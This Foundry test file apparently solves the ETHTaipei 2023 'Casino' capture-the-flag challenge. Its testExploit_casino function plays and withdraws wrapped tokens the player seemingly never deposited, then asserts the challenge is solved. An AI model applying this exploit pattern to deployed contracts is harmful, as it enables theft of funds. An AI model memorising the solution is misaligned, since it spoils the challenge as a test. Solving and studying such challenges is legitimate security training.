// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import "forge-std/Test.sol";
import {CasinoBase, Casino} from "../../src/ETHTaipei2023/Casino/Casino.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;
    address public wNative;
    address public you;
    address public owner;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;

        base = new CasinoBase(startTime, endTime, fullScore);
        you = makeAddr("you");
        wNative = address(base.wNative());
        base.setup();
        casino = base.casino();
    }

    function testExploit_casino() public {
        uint256 blockNum = block.number;
        vm.startPrank(you);
        console.log(IERC20(casino.CToken(wNative)).balanceOf(you));

        // simulate playing the slot in upcoming blocks
        // do {
        //     vm.roll(blockNum++);
        // } while (casino.slot() == 0);

        // play with wNative
        casino.play(wNative, 5000e18);
        console.log("cToken balance of you: %e", IERC20(casino.CToken(wNative)).balanceOf(you));

        casino.withdraw(wNative, 1_000e18);

        // solve
        base.solve();
        assertTrue(base.isSolved());
        vm.stopPrank();
    }
}
